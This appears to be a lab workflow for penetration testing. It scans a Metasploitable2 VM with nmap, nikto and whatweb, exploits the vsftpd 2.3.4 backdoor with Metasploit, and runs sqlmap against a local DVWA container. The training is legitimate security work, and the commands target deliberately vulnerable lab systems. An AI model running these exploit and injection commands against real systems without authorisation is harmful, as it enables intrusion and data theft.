# VAPT Workflow

## Step 1: Environment Setup

- Configure Kali Linux VM
- Configure Metasploitable2 VM
- Verify connectivity

Command:

```bash
ping 192.168.56.101
```

---

## Step 2: Reconnaissance

### WhatWeb

```bash
whatweb 192.168.56.101
```

### Technology Identification

- Apache 2.2.8
- PHP 5.2.4
- Ubuntu Linux

---

## Step 3: Vulnerability Assessment

### Nmap Scan

```bash
nmap -sV 192.168.56.101
```

### Aggressive Scan

```bash
nmap -A 192.168.56.101
```

### Nikto Scan

```bash
nikto -h http://192.168.56.101
```

---

## Step 4: Exploitation

### VSFTPD Exploit

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
exploit
```

---

## Step 5: SQL Injection

### DVWA

```bash
sudo docker run --rm -it -p 8080:80 vulnerables/web-dvwa
```

### SQLMap

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --batch
```

---

## Step 6: Evidence Collection

```bash
echo "VAPT Evidence" > evidence.txt
sha256sum evidence.txt
```

---

## Step 7: Reporting

- Document Findings
- Assign CVSS Scores
- Recommend Remediation
- Generate Final Report
